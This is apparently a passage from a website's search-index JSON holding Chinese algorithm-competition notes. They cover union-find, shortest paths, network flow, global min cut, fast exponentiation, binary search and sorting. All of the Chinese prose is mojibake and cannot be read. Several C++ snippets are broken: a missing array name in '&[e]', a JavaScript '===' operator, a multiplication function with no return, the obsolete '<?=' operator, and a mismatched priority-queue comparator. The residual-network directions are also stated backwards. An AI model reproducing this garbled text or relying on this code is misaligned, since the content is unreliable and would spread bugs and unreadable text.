æˆ‘ä»¬åªå…³å¿ƒè¿é€šè¿™ä¸€ä¸ªä¿¡æ¯ï¼Œä¸å…³å¿ƒå…·ä½“çš„è¿é€šæ–¹å¼ï¼Œç±»ä¼¼äºä¸€ä¸ªé›†åˆï¼›  è¿™ä¸ªé—®é¢˜å¯ä»¥ç”¨ä¸€ä¸ªæ ‘çŠ¶ç»“æ„â€œå¹¶æŸ¥é›†â€è¡¨ç¤ºï¼Œå¹¶æŸ¥é›†ç”±å¤šä¸ªé›†åˆæ„æˆï¼Œæ¯ä¸ªé›†åˆé€šè¿‡ä¸€é¢—æ ‘çŠ¶çš„ç»“æ„è¡¨ç¤ºï¼Œä¸¤ä¸ªèŠ‚ç‚¹å¦‚æœå±äºåŒä¸€ä¸ªâ€œè¿é€šåˆ†é‡â€ï¼Œé‚£ä¹ˆå®ƒä»¬ä¸€å®šå±äºåŒä¸€æ£µæ ‘ï¼Œè¿™æ£µæ ‘çš„æ ¹èŠ‚ç‚¹è¢«ç§°ä¸ºè¿™ä¸ªé›†åˆçš„â€œä»£è¡¨å…ƒâ€ï¼ˆrepresentativeï¼‰ã€‚\nå®ç°ä¸€ä¸ªå¹¶æŸ¥é›†æ ¸å¿ƒåœ¨ä¸ find æ–¹æ³• ï¼Œå³å¦‚ä½•æ‰¾åˆ°ä¸€ä¸ªç»™å®šèŠ‚ç‚¹æ‰€åœ¨çš„æ ‘çš„ä»£è¡¨å…ƒï¼š\nint find(int x) {  return p[x] == x ? x : p[x] = find(p[x]); } æœ€çŸ­è·¯é—®é¢˜ #  Dijkstra ç®—æ³• #  ä¹‹å‰åŠ¨æ€è§„åˆ’çš„ç« èŠ‚ä¸­æœ‰æåˆ° DAG ä¸­çš„åŠ¨æ€è§„åˆ’å¯ä»¥ç”¨äºè§£å†³æœ€çŸ­è·¯é—®é¢˜ã€‚ä½†æ˜¯å¦‚æœå›¾ä¸­æœ‰ç¯ï¼Œé‚£ä¹ˆä¹‹å‰çš„æ–¹æ³•å°±ä¸é€‚ç”¨äº†ã€‚\nDijkstra ç®—æ³•å¯ä»¥ç”¨äºè®¡ç®—æ­£æƒå›¾ä¸Šçš„å•æºæœ€çŸ­è·¯é—®é¢˜ï¼ˆSSSP, Single-Source Shortest Pathsï¼‰ã€‚ç”¨ w[i][j] è¡¨ç¤ºä¸¤ä¸ªè¾¹ä¹‹é—´çš„æƒå€¼ï¼ˆINF è¡¨ç¤ºä¸è¿æ¥ï¼‰ï¼Œd[i] è¡¨ç¤ºæºèŠ‚ç‚¹åˆ°èŠ‚ç‚¹ i çš„è·ç¦»ï¼Œé‚£ä¹ˆ Dijkstra ç®—æ³•æ˜¯å®ç°å¦‚ä¸‹ï¼š\nmemset(v, 0, sizeof(v)); for (int i = 0; i \u0026lt; n; i++) d[i] = i == 0 ? 0 : INF; for (int i = 0; i \u0026lt; n; i++) {  int x, m = INF;  for (int y = 0; y \u0026lt; n; y++) if (!v[y] \u0026amp;\u0026amp; d[y] \u0026lt;= m) m = d[x=y];  v[x] = 1;  for (int y = 0; y \u0026lt; n; y++) d[y] \u0026lt;?= d[x] + w[x][y]; } ç®€å•åœ°æ¥è¯´ï¼ŒDijkstra ç®—æ³•åˆ†ä¸ºä»¥ä¸‹ä¸¤æ­¥ï¼š\n åœ¨æ‰€ä»¥æœªè®¿é—®çš„èŠ‚ç‚¹ä¸­ï¼Œæ‰¾å‡ºè·ç¦»æºèŠ‚ç‚¹æœ€è¿‘çš„èŠ‚ç‚¹ xï¼› ç»™ x åšæ ‡è®°ï¼Œå¹¶ä¸”æ›´æ–°æ‰€æœ‰ä¸ x å“é“ƒçš„ç‚¹åˆ°æºèŠ‚ç‚¹çš„è·ç¦»ï¼›  æˆ‘ä»¬é€šå¸¸æŠŠè¿™ä¸ªç®—æ³•çš„ç¬¬äºŒæ­¥ç§°ä¸ºæ¾å¼›æ“ä½œï¼ˆrelexationï¼‰ã€‚\nä¼˜åŒ– Dijkstra ç®—æ³• #  é‚»æ¥è¡¨ï¼ˆAdjacency Listï¼‰ï¼šä¸€ç§ç¨€ç–å›¾ï¼ˆSparse Graphï¼‰çš„è¡¨ç¤ºæ–¹å¼ã€‚åœ¨è¿™ç§è¡¨ç¤ºæ³•ä¸­ï¼Œæ¯ä¸ªç»“ç‚¹ i éƒ½æœ‰ç»´æŠ¤ä¸€ä¸ªé“¾è¡¨ï¼Œé‡Œé¢ä¿å­˜ç€ä» i å‡ºå‘çš„æ‰€æœ‰è¾¹ã€‚\nä»¥ä¸‹æ˜¯ä¸€ä¸ªä»è¯»å…¥å¼€å§‹çš„ä¾‹å­ï¼š\nint n, m; int first[MAXN]; int u[MAXM], v[MAXM], w[MAXM], next[MAXM]; void read_graph() {  scanf(\u0026#34;%d%d\u0026#34;, \u0026amp;n, \u0026amp;m);  for (int i = 0; i \u0026lt; n; i++) first[i] = -1;  for (int e = 0; e \u0026lt; m; e++)  {  scanf(\u0026#34;%d%d%d\u0026#34;, \u0026amp;u[e], \u0026amp;v[e], \u0026amp;[e]);  next[e] = first[u[e]];  first[u[e]] = e;  } } å…¶ä¸­ï¼š\n u/v/w éƒ½æ˜¯åŸå§‹è¾“å…¥ï¼Œåˆ†åˆ«ä¸ºç¼–å·ä¸º e çš„è¾¹è¿æ¥çš„ä¸¤ä¸ªèŠ‚ç‚¹ï¼Œä»¥åŠè¿™ä¸ªè¾¹çš„æƒå€¼ï¼› first è¡¨ç¤ºç¼–å·ä¸º i çš„èŠ‚ç‚¹çš„ç¬¬ä¸€ä¸ªè¾¹ï¼Œç”¨ next è¿æ¥æ‰€æœ‰çš„è¾¹ï¼›  ä½¿ç”¨é‚»æ¥è¡¨å¯ä»¥ä¼˜åŒ– Dijkstra ç®—æ³•çš„ç¬¬äºŒæ­¥ï¼Œä» O(n) ä¼˜åŒ–åˆ° O(m)ã€‚å¯¹äºç®—æ³•çš„ç¬¬ä¸€æ­¥ï¼Œå³â€œæ‰¾å‡ºæœªæ ‡å·èŠ‚ç‚¹ä¸­çš„æœ€å° d å€¼â€ï¼Œå¯ä»¥ä½¿ç”¨ä¼˜å…ˆçº§é˜Ÿåˆ—è¿›è¡Œä¼˜åŒ–ã€‚\nä½¿ç”¨ä¼˜å…ˆçº§é˜Ÿåˆ—çš„ä»£ç å®ç°å¦‚ä¸‹ï¼š\nstruct cmp {  bool operator() (const int a, const int b) {  return a % 10 \u0026gt; b % 10;  } } priority_queue\u0026lt;int, vector\u0026lt;int\u0026gt;, cmp\u0026gt; q; ä½¿ç”¨ä¼˜å…ˆçº§é˜Ÿåˆ—å¯ä»¥æŠŠç¬¬ä¸€æ­¥çš„å¤æ‚åº¦ä» O(n) é™ä½åˆ° O(logn)ã€‚\nBellman-Ford ç®—æ³• #  ä¸ Dijkstra ç®—æ³•ç±»ä¼¼ï¼ŒBellman-Ford ç®—æ³•ä¸»è¦åˆ†ä¸ºä»¥ä¸‹ä¸¤æ­¥ï¼š\n éå†æ‰€æœ‰èŠ‚ç‚¹ï¼Œå¯¹æ¯ä¸ªç»“ç‚¹æ‰§è¡Œæ¾å¼›æ“ä½œï¼› æ›´æ–°å½“å‰éå†èŠ‚ç‚¹çš„æ‰€æœ‰ç›¸é‚»èŠ‚ç‚¹ï¼Œå¯¹ä»–ä»¬ä¹Ÿæ‰§è¡Œæ¾å¼›æ“ä½œã€‚  è¿™ä¸ªç®—æ³•çš„æœ´ç´ å®ç°æ˜¯ O(mn)ï¼Œå…·ä½“åœ¨å®ç°æ—¶å¯ä»¥ä½¿ç”¨ FIFO è¿›è¡Œä¼˜åŒ–ï¼š\nqueue\u0026lt;int\u0026gt; q; bool inq[MAXN]; for (int i = 0; i \u0026lt; n; i++) d[i] = i == 0 ? 0 : INF; memset(inq, 0, sizeof(inq)); q.push(0); while(!q.empty()) {  int x = q.front(); q.pop();  inq[x] = false;  for (int e = first[x]; e != -1; e = next[e]) if (d[v[e]] \u0026gt; d[x] + w[e]) {  d[v[e]] = d[x] + w[e];  if (!inq[v[e]]) {  inq[v[e]] = true;  q.push(v[e]);  }  } } Floyd ç®—æ³• #  å¦‚æœä½ ä»…ä»…éœ€è¦è®¡ç®—ä¸¤ä¸ªç‚¹ä¹‹é—´çš„æœ€çŸ­è·¯ï¼Œä¸å¿…è°ƒç”¨ n æ¬¡ Dijkstraï¼ˆè¾¹æƒå‡ä¸ºæ­£ï¼‰æˆ–è€… Belman-Fordï¼ˆæœ‰è´Ÿæƒï¼‰ã€‚åªéœ€è¦ä½¿ç”¨ä¸‹é¢çš„ Floyd-Warshall ç®—æ³•ï¼š\nfor (int k = 0; k \u0026lt; n; k++)  for (int i = 0; i \u0026lt; n; i++)  for (int j = 0; j \u0026lt; n; j++)  d[i][j] \u0026lt;?= d[i][k] + d[k][j] ç½‘ç»œæµåˆæ­¥ #  å¢å¹¿è·¯å®šç† #   å¯¹äºä¸€ä¸ªç½‘ç»œæ‹“æ‰‘å›¾ G=(V, E)ï¼Œå¯¹äºæ¯æ¡è¾¹ $$(u, v) \\in E$$ï¼Œæœ‰ä¸€ä¸ªè¿é€ç‰©å“çš„ä¸Šé™ç§°ä¸ºå®¹é‡ c(u,v)ï¼Œå®ƒåœ¨ä¸€ä¸ªç‰¹å®šçš„é—®é¢˜ä¸‹å®é™…è¿é€çš„ç‰©å“æ•°é‡ç§°ä¸ºæµé‡ f(u, v)ã€‚\næœ€å¤§æµé—®é¢˜ï¼šæ±‚ä¸€ä¸ªæ–¹æ¡ˆï¼ŒæŠŠæœ€å¤šçš„ç‰©å“ä» s è¿é€åˆ° tï¼ˆå…¶ä¸­ $$s, t \\in V$$ï¼‰\n é—®é¢˜ä¸­é€šè¿‡ fã€c å»ºæ¨¡æè¿°çš„æœ€å¤§æµé—®é¢˜æ»¡è¶³è¿™æ ·çš„ä¸€äº›æ€§è´¨ï¼š\n å®¹é‡é™åˆ¶ï¼š$$f(u, v) \\le c(u, v)$$ æ–œå¯¹ç§°æ€§ï¼š$$f(u, v) = -f(v, u)$$ æµé‡å¹³è¡¡ï¼šå¯¹äºé™¤äº† sã€t ä¹‹å¤–çš„ä»»æ„èŠ‚ç‚¹ uï¼Œ$$\\displaystyle \\sum_{(u, v) \\in E} f(u, v) = 0$$  æ®‹é‡ç½‘ç»œï¼ˆresidual networkï¼‰ï¼š\n å¯¹äº E ä¸­çš„æ¯ä¸€æ¡è¾¹ (u,v) éƒ½æœ‰ fã€c ä¸¤ä¸ªå±æ€§å€¼ï¼Œå¯¹å›¾ä¸­çš„æ¯ä¸€æ¡è¾¹è¿›è¡Œè®¡ç®—ï¼Œå°† (u, v) è¿™æ ·ä¸€ä¸ªæœ‰å‘è¾¹åˆ†è§£æˆä¸¤ä¸ªæœ‰å‘è¾¹ï¼šu åˆ° v ä¸”æƒå€¼ä¸º fï¼›v åˆ° u ä¸”æƒå€¼ä¸º c-fï¼› é€šè¿‡è¿™æ ·çš„æ–¹å¼æ„é€ å‡ºæ¥çš„ä¸€å¼ æ–°å›¾ç§°ä¸ºæ®‹é‡ç½‘ç»œ  å¢å¹¿ï¼ˆaugmentingï¼‰ï¼š\n åœ¨æ®‹é‡ç½‘ç»œä¸­æ‰¾å‡ºä»»æ„ä¸€æ¡ä» s åˆ° t çš„æœ‰å‘è·¯å¾„ï¼Œæ‰¾å‡ºé“è·¯ä¸­æ‰€æœ‰æ®‹é‡çš„æœ€å°å€¼ dï¼ŒæŠŠå¯¹åº”æ‰€æœ‰è¾¹ä¸Šçš„æµé‡å¢åŠ  dã€‚ ä¸Šé¢æè¿°çš„è¿™ä¸ªè¿‡ç¨‹ç§°ä¸ºå¢å¹¿ã€‚  å¢å¹¿è·¯å®šç†ï¼š\n å½“ä¸”ä»…å½“æ®‹é‡ç½‘ç»œä¸­ä¸å­˜åœ¨ s-t æœ‰å‘è·¯å¾„æ—¶ï¼Œæ­¤æ—¶çŠ¶æ€å¯¹åº”çš„æµæ˜¯ s åˆ° t çš„æœ€å¤§æµã€‚  æ ¹æ®å¢å¹¿è·¯å®šç†æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ BFS éå†æ‰€æœ‰è·¯å¾„ï¼Œè¿™è¢«ç§°ä¸º Edonds-Karp ç®—æ³•ï¼š\nqueue\u0026lt;int\u0026gt; q; memset(flow, 0, sizeof(flow)); f = 0; while (true) {\t// å¾ªç¯å‡ºå£æ˜¯ï¼Œæ‰¾ä¸åˆ°ä» s åˆ° t çš„è·¯å¾„  memset(a, 0, sizeof(a));  a[s] = INF;  q.push(s);  while (!q.empty()) {  int u = q.front(); q.pop();  for (int v = 1; v \u0026lt;= n; v++) if (!a[v] \u0026amp;\u0026amp; cap[u][v] \u0026gt; flow[u][v]) {  p[v] = u; q.push(v);  a[v] = a[u] \u0026lt;? cap[u][v] - flow[u][v];  }  }  if (a[t] === 0) break;  for (int u = t; u != s; u = p[u]) {  flow[p[u]][u] += a[t];  flow[u][p[u]] -= a[t];  }  f += a[t]; } å…¶ä¸­ a[i] è¡¨ç¤ºåœ¨å½“å‰è·¯å¾„ä¸‹ï¼Œä»æºèŠ‚ç‚¹ s åˆ° i çš„æœ€å°æ®‹é‡ï¼Œé‚£ä¹ˆ a[t] å°±æ˜¯æ•´ä¸ªé“¾è·¯çš„æœ€å°æ®‹é‡ã€‚\næœ€å°å‰²æœ€å¤§æµå®šç† #  å‰²ï¼š\n æŠŠå›¾çš„æ‰€æœ‰é¡¶ç‚¹åˆ†æˆ Sã€T ä¸¤ä¸ªé›†åˆï¼Œå…¶ä¸­ $$s \\in S, t \\in T$$ï¼ŒæŠŠé›†åˆ $${e = (u, v)| u \\in S, v \\in T}$$ ä¸­çš„æ‰€æœ‰è¾¹åˆ é™¤ï¼Œå°±æ— æ³•ä» s è¾¾åˆ° t äº†ã€‚ æˆ‘ä»¬æŠŠè¿™æ ·çš„é›†åˆåˆ’åˆ†æ–¹å¼ç§°ä¸ºä¸€ä¸ª s-t çš„å‰²ã€‚  ä¸€ä¸ªå‰²çš„å®¹é‡å¯ä»¥å®šä¹‰ä¸ºï¼š$$\\displaystyle c(S, T) = \\sum_{u \\in S, v \\in T} c(u, v)$$ï¼Œæ±‚å®¹é‡æœ€å°å‰²çš„é—®é¢˜å³æœ€å°å‰²é—®é¢˜ã€‚\næœ€å°å‰²æœ€å¤§æµå®šç†ï¼š\n  åœ¨å¢å¹¿è·¯ç®—æ³•ä¸­ï¼Œå¾ªç¯ç»“æŸçš„æ¡ä»¶æ˜¯æ‰¾ä¸åˆ°ä¸€ä¸ªä» s åˆ° t çš„è·¯å¾„ï¼Œåœ¨æœ€åä¸€ä¸ªå¾ªç¯å‘¨æœŸä¸­ï¼Œä» s é€šè¿‡ BFS åˆ°è¾¾è¿‡çš„èŠ‚ç‚¹å¯ä»¥ç»„æˆä¸€ä¸ªé›†åˆ Sï¼Œå®ƒä¸å‰©ä¸‹èŠ‚ç‚¹çš„é›†åˆ T å°±æ„æˆä¸€ä¸ª s-t å‰²ï¼›\n  é€šè¿‡ä¸Šé¢çš„æ˜ å°„å…³ç³»ä»æœ€å¤§æµæ˜ å°„åˆ°çš„å‰²ï¼Œå°±æ˜¯æœ€å°å‰²ï¼›\n  è¯æ˜ï¼šé€šè¿‡ $$|f| \\le c(S, T)$$\næœ€å°è´¹ç”¨æœ€å¤§æµé—®é¢˜ #  å»ºæ¨¡æ—¶å¯ä»¥ç”¨è´Ÿæ•°è¡¨ç¤ºå®¹é‡ï¼Œä½¿ç”¨ Bellman-Ford ç®—æ³•è€Œä¸æ˜¯ BFSã€‚\nå…¨å›¾æœ€å°å‰² #   å‚è€ƒï¼š\n https://www.zhihu.com/question/265186138/answer/290726001 https://en.wikipedia.org/wiki/Stoer%E2%80%93Wagner_algorithm   å…¨å±€æœ€å°å‰²ï¼ˆæˆ–â€œå…¨å±€å‰²â€ï¼‰å³å›¾çš„æ‰€æœ‰å‰²ä¸­ï¼Œå®¹é‡æœ€å°çš„å‰²æˆä¸ºè¿™ä¸ªå›¾çš„å…¨å±€æœ€å°å‰²ã€‚\néšæœºç®—æ³• Karger\u0026rsquo;s Algorithmï¼š\n ç®—æ³•æè¿°ï¼šå¯¹ä¸€ä¸ªå›¾ $$G = (V, E)$$ï¼Œéšæœºé€‰æ‹©å›¾ä¸­çš„ä¸€æ¡è¾¹ $$e = (v_1, v_2) \\in E$$ï¼Œå¯¹è¿™æ¡è¾¹é“¾æ¥çš„ä¸¤ä¸ªç‚¹ $$v_1, v_2$$ è¿›è¡Œâ€œç¼©ç‚¹â€ï¼ŒçŸ¥é“å›¾ä¸­åªå‰©ä¸‹ä¸¤ä¸ªç‚¹ï¼Œè¿™ä¸¤ä¸ªç‚¹å¯¹åº”ç€åŸå›¾çš„ä¸€ä¸ªå‰²ã€‚éšæœºæ‰§è¡Œå¤šæ¬¡ä¹‹åå¯ä»¥æ‰¾åˆ°æ¦‚ç‡ä¸Šçš„æœ€å°å‰²ã€‚ æ¦‚ç‡è®¡ç®—ï¼šå³æ¯æ¬¡ç¼©ç‚¹ç»“æŸåå¾—åˆ°çš„å‰²ï¼Œæ˜¯åŸå›¾çš„æœ€å°å‰²çš„æ¦‚ç‡æ˜¯å¤šå°‘ï¼š  è®¾å›¾çš„æœ€å°å‰²ä¸­ï¼Œä¸¤ä¸ªé›†åˆä¹‹é—´çš„è¾¹é›†ä¸º $$E\u0026rsquo;$$ï¼Œé‚£ä¹ˆè€ƒè™‘éšæœºç®—æ³•çš„ç¬¬ä¸€æ­¥ï¼ŒæˆåŠŸçš„æ¦‚ç‡ä¸º $$\\displaystyle 1 - \\frac{|E\u0026rsquo;|}{|E|}$$ï¼› å› ä¸ºè¾¹é›† $$E\u0026rsquo;$$ æ„æˆçš„å‰²æ˜¯åŸå›¾æœ€å°å‰²ï¼Œæ¯ä¸ªèŠ‚ç‚¹çš„åº¦éƒ½åº”è¯¥å°äºä»–çš„åŠ¿ï¼Œé‚£ä¹ˆä¸€å®šæ»¡è¶³æ¡ä»¶ $$\\displaystyle \\sum_{v \\in V}|E\u0026rsquo;| \\le 2|E| \\Rightarrow |E| \\ge \\frac{|V||E\u0026rsquo;|}{2} $$ ç»¼åˆä»¥ä¸Šä¸¤ä¸ªä¸ç­‰å¼ï¼Œå¯¹ç¬¬ä¸€æ¬¡æˆåŠŸçš„æ¦‚ç‡æœ‰ä¸ç­‰å¼ï¼š$$\\displaystyle p_{first} = 1 - \\frac{|E\u0026rsquo;|}{|E|} \\ge 1 - \\frac{2 |E\u0026rsquo;|}{|V| |E\u0026rsquo;|} = 1 - \\frac{2}{|V|}$$ ä¸Šé¢çš„æ¦‚ç‡ä¸ç­‰å¼ä¸ $$|E\u0026rsquo;|$$ æ— å…³çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€’å½’åœ°è®¡ç®—ç»¼åˆæ¦‚ç‡ï¼š$$\\displaystyle p_n \\ge (1 - \\frac{2}{|V|}) p_{n-1} = \\prod_{i = 0}^{n-3}\\frac{|V| - i - 2}{|V| - i} = \\frac{1}{C_{|V|}^2}$$   æ—¶é—´å¤æ‚åº¦è®¡ç®—ï¼šè€ƒè™‘æ‰§è¡Œ $$T = C_{|V|}^2 \\ln{|V|}$$ æ¬¡éšæœºçš„è®¡ç®—ï¼š  å¯ä»¥è®¤ä¸º $$C^{2}{n}$$ æ˜¯ä¸€ä¸ªæå¤§çš„æ•°å­—ï¼Œåœ¨è¿›è¡Œäº† T æ¬¡è®¡ç®—åå¤±è´¥æ¦‚ç‡ $$\\displaystyle (1 - \\frac{1}{C{|V|}^2})^{C_{|V|}^2 \\ln{|V|}} \\rightarrow (\\frac{1}{e})^{\\ln{|V|}} = \\frac{1}{|V|}$$ æ‰§è¡Œ T æ¬¡è®¡ç®—çš„æ€»æ—¶é—´å¤æ‚åº¦ä¸ºï¼š$$O(T |E|) \\approx |V|^2 |E| \\ln{|V|}$$    è¿­ä»£ç®—æ³• Stoer-Wagner Algorithmï¼š\n ç®—æ³•æè¿°ï¼šå¯¹äºä¸€ä¸ªå›¾ $$G = (V, E)$$ï¼š  éšæœºåˆå§‹åŒ–ä¸€ä¸ªç‚¹é›† $$A = { v | v \\in V }$$ï¼Œä¾æ¬¡å°†ç¼©ç‚¹æˆæœ¬ï¼ˆ$\\displaystyle v \\in V/A \\rightarrow \\sum_{u \\in A, uv \\in E} w(uv)$ï¼‰æœ€å¤§çš„ç‚¹åŠ å…¥ç‚¹é›†ï¼› ç›´åˆ°åŠ å…¥å€’æ•°ç¬¬äºŒä¸ªç‚¹ $v_{penult}$ï¼Œå‰©ä¸‹æœ€åä¸€ä¸ªç‚¹ $$v_{last}$$ï¼Œé‚£ä¹ˆ $v_{penult}-v_{last}$ çš„æœ€å°å‰²å³ ${v | v \\in A, v \\not= v_{last}}, {v_{last}}$ é‡å¤å‰é¢ä¸¤ä¸ªæ­¥éª¤ $|V| - 1$ æ¬¡ï¼Œæ¯æ¬¡å¯ä»¥å¾—åˆ°ä¸€ä¸ªæœ€å°å‰²ï¼Œè¿™äº›æœ€å°å‰²ä¸­æœ€å°çš„å³å…¨å±€æœ€å°å‰²ï¼›    "},{"id":362,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B%E8%BF%9B%E9%98%B6%E6%8C%87%E5%8D%97/1.%E5%9F%BA%E6%9C%AC%E7%AE%97%E6%B3%95/","title":"1.åŸºæœ¬ç®—æ³•","section":"ç®—æ³•ç«èµ›è¿›é˜¶æŒ‡å—","content":"åŸºæœ¬ç®—æ³• #  ä½è¿ç®— #  å¿«é€Ÿå¹‚ï¼š\nint powmod(int a, int b, int p) {  int ans = 1 % p;  for (; b; b \u0026gt;\u0026gt;= 1) {  if (b \u0026amp; 1) ans = ((long long)ans * a) % p;  a = ((long long)a * a) % p;  }  return ans; } å¤§æ•°ä¹˜æ³•å–æ¨¡ï¼ˆå¯èƒ½æº¢å‡ºï¼‰ï¼š\nlong long mul(long long a, long long b, long long p) {  long long ans = 0;  for (; b; b \u0026gt;\u0026gt;= 1) {  if (b \u0026amp; 1) ans = (ans + a) % p;  a = (a * 2) % p;  } } lowbit ç®—æ³•ï¼š\nint lowbit(int n) {  return n \u0026amp; (-n); } æšä¸¾ã€æ¨¡æ‹Ÿã€é€’æ¨ #  é€’å½’ #  äºŒåˆ† #  äºŒåˆ†çš„å®ç°éœ€è¦æ³¨æ„ç»†èŠ‚ï¼š\n å¯¹äºæ•´æ•°åŸŸä¸Šçš„äºŒåˆ†ï¼Œéœ€è¦æ³¨æ„ç»ˆæ­¢è¾¹ç•Œã€å·¦å³åŒºé—´å–èˆæ—¶çš„å¼€é—­æƒ…å†µï¼Œé¿å…é—æ¼ç­”æ¡ˆé€ æˆæ­»å¾ªç¯ï¼› å¯¹äºå®æ•°åŸŸä¸Šçš„äºŒåˆ†ï¼Œéœ€è¦æ³¨æ„ç²¾åº¦é—®é¢˜ã€‚  æ¨¡ç‰ˆï¼šåœ¨å•è°ƒé€’å¢åºåˆ—ä¸­æŸ¥æ‰¾ \u0026gt;=x çš„æ•°ä¸­æœ€å°çš„ä¸€ä¸ªï¼š\nwhile (l \u0026lt; r) {  int mid = (l + r) / 2;  if (a[mid] \u0026gt;= x) r = mid; else l = mid + 1; } return a[l]; æ¨¡ç‰ˆï¼šåœ¨å•è°ƒé€’å¢åºåˆ—ä¸­æŸ¥æ‰¾ \u0026lt;=x çš„æ•°ä¸­æœ€å°çš„ä¸€ä¸ªï¼š\nwhile (l \u0026lt; r) {  int mid = (l + r + 1) / 2;  if (a[mid] \u0026lt;= x) l = mid; else r = mid - 1; } return a[l]; æ¨¡ç‰ˆï¼šå®æ•°åŸŸäºŒåˆ†ï¼Œä¿ç•™ k ä½å°æ•°æ—¶ï¼š\nwhile (l + 1e-5 \u0026lt; r) {  double mid = (l + r) / 2;  if (calc(mid)) r = mid; else l = mid; } return l æ¨¡ç‰ˆï¼šæ±‚å•å³°å‡½æ•°æå€¼ï¼ˆä¸‰åˆ†æ³•ï¼‰ï¼š\nwhile (l + 1e-5 \u0026lt; r) {  double lmid = (2 * l + r) / 3, rmid = (l + 2 * r) / 3;  if (f(lmid) \u0026lt; f(rmid)) l = lmid;  else if (f(lmid) \u0026gt; f(rmid)) r = rmid;  else l = lmid, r = rmid; } return l; ä¾‹é¢˜ï¼ˆè´ªå¿ƒï¼Œå°†äºŒåˆ†ç­”æ¡ˆè½¬åŒ–ä¸ºåˆ¤å®šï¼‰ï¼š\n æœ‰ N æœ¬ä¹¦æ’æˆä¸€è¡Œï¼Œå·²çŸ¥ç¬¬ i æœ¬ä¹¦çš„åšåº¦æ˜¯ $A_i$ã€‚\næŠŠå®ƒä»¬è¿ç»­åœ°åˆ†æˆ M ç»„ï¼Œä½¿å¾— T æœ€å°åŒ–ï¼Œå…¶ä¸­ T è¡¨ç¤ºåšåº¦ä¹‹å’Œæœ€å¤§çš„ä¸€ç»„çš„åšåº¦ã€‚\n æ³¨æ„åˆ°è¿™æ ·çš„ä¸€ä¸ªå‡½æ•°æ˜¯å•è°ƒçš„ï¼š\n ä»¥åˆ†ç»„æ•° M ä½œä¸ºå®šä¹‰åŸŸï¼Œåœ¨ä½œä¸ºåˆ†ç»„æ–¹å¼ä¸­ï¼ŒT æœ€å°çš„ä¸€ç»„ï¼Œå…¶ä¸­çš„ T ä½œä¸ºå€¼åŸŸã€‚  æ’åº #  æ’åºç®—æ³•åˆ†ä¸ºä¸‰ç±»ï¼š\n  $$O(n^2)$$ ç®—æ³•: â€é€‰æ‹©æ’åºâ€œã€â€æ’å…¥æ’åºâ€œã€â€å¿«é€Ÿæ’åºâ€œï¼›\n  $$O(n logn)$$ ç®—æ³•: â€å †æ’åºâ€œã€â€å½’å¹¶æ’åºâ€œã€â€å¿«é€Ÿæ’åºâ€œï¼›\n  æœ€ä¼˜ $$O(n)$$ ç®—æ³•: â€è®¡æ•°æ’åºâ€œã€â€åŸºæ•°æ’åºâ€œã€â€æ¡¶æ’åºâ€œï¼›\n  è´§ä»“é€‰å€é—®é¢˜ï¼š\n èƒŒæ™¯ï¼šä¸€æ¡æ•°è½´ä¸Šæœ‰ N ä¸ªå•†åº—ï¼Œéœ€è¦åœ¨æ•°è½´ä¸Šå»ºç«‹ä¸€ä¸ªè´§ä»“ï¼Œæ˜¯çš„è´§ä»“åˆ°æ¯ä¸ªå•†åº—çš„è·ç¦»ä¹‹å’Œæœ€å°ï¼› è§£å†³æ–¹æ¡ˆï¼šå®¹æ˜“å¾—ä¹‹ï¼ŒæŠŠè´§ä»“å»ºåœ¨ä¸­ä½æ•°çš„ä½ç½®ï¼Œæ˜¯æ»¡è¶³é¢˜æ„çš„æœ€ä¼˜è§£ä½ç½®ï¼›  å‡åˆ†çº¸ç‰Œé—®é¢˜ï¼š\n èƒŒæ™¯ï¼šæœ‰ M ä¸ªäººæ’æˆä¸€æ’ï¼Œå®ƒä»¬æ‰‹ä¸­åˆ†åˆ«æœ‰ C[1]~C[M] å¼ çº¸ç‰Œï¼Œåœ¨æ¯ä¸€æ­¥æ“ä½œä¸­ï¼Œå¯ä»¥è®©æŸä¸ªäººæŠŠæ‰‹ä¸­çš„ä¸€å¼ çº¸ç‰Œäº¤ç»™æ—è¾¹çš„ä¸€ä¸ªäººï¼Œæ±‚è‡³å°‘éœ€è¦å¤šå°‘æ­¥æ“ä½œæ‰èƒ½è®©æ¯ä¸ªäººæ‰‹ä¸­çš„çº¸ç‰Œæ•°é‡ç›¸ç­‰ï¼› è§£å†³æ–¹æ¡ˆï¼šä»ç¬¬ä¸€ä¸ªäººå¼€å§‹åˆ†æƒ…å†µé€’å½’å¯ä»¥å¾—åˆ°å…¬å¼ï¼š$$\\displaystyle \\sum_{i = 1}^{M}|i * \\frac{T}{M} - S[i]|$$ï¼Œå…¶ä¸­ S è¡¨ç¤ºå‰ç¼€å’Œï¼›  ç¯å½¢å‡åˆ†çº¸ç‰Œé—®é¢˜ï¼š\n èƒŒæ™¯ï¼šåœ¨å‡åˆ†çº¸ç‰Œé—®é¢˜çš„èƒŒæ™¯ä¸‹ï¼Œç¬¬ä¸€ä¸ªäººå’Œæœ€åä¸€ä¸ªäººå¯ä»¥äº¤æ¢çº¸ç‰Œï¼› è§£å†³æ–¹æ¡ˆï¼š  å‡è®¾æ¯ä¸ªäººæ‰‹ä¸­çš„çº¸ç‰Œå‡å» $$\\displaystyle \\frac{T}{M}$$ï¼Œä½¿å¾— $$S[M] = 0$$ï¼ˆè´Ÿæ•°çš„æŒæœ‰ç‰Œæ•°å¹¶ä¸ä¼šå½±å“ç»“è®ºçš„è®¨è®ºï¼‰ï¼› å¯ä»¥è¯æ˜ä¸€å®šå­˜åœ¨ä¸€å¯¹ç›¸é‚»çš„äººä¹‹é—´æ²¡æœ‰å‘ç”Ÿçº¸ç‰Œçš„äº¤æ¢ï¼Œæšä¸¾è¿™ä¸ªä½ç½®å¾—åˆ°ï¼š$$\\displaystyle \\sum_{i = 1}^M |S[i] - S[k]|$$ æ±‚è§£ä¸Šè¿°å…¬å¼åœ¨ k ä¸ºå˜é‡æƒ…å†µä¸‹çš„æœ€å°å€¼ï¼Œå³â€œè´§ä»“é€‰å€â€é—®é¢˜ï¼Œå¯¹ S[i] è¿›è¡Œæ’åºæ—¢å¾—ç»“æœï¼›    åŠ¨æ€ä¸­ä½æ•°é—®é¢˜ï¼š\n 